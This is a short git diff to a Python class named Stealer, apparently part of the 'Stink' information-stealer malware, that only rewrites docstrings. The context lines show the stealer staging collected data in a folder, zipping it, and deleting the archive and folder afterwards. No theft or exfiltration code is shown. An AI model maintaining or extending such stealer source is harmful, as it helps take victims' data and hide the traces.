@@ -160,7 +160,12 @@ class Stealer(Thread):
     def __create_storage(self) -> None:
         """
         Creates storage for the Stink.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         if not path.exists(self.__config.StoragePath):
             makedirs(self.__config.StoragePath)
@@ -171,14 +176,24 @@ class Stealer(Thread):
     def __create_archive(self) -> None:
         """
         Creates a data archive.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         make_archive(path.join(path.dirname(self.__config.StoragePath), self.__config.ZipName), "zip", self.__config.StoragePath)
 
     def __delete_files(self) -> None:
         """
         Deletes the archive and storage.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         rmtree(self.__config.StoragePath)
         remove(path.join(path.dirname(self.__config.StoragePath), rf"{self.__config.ZipName}.zip"))
@@ -186,7 +201,12 @@ class Stealer(Thread):
     def run(self) -> None:
         """
         Launches the Stink.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         try:
 
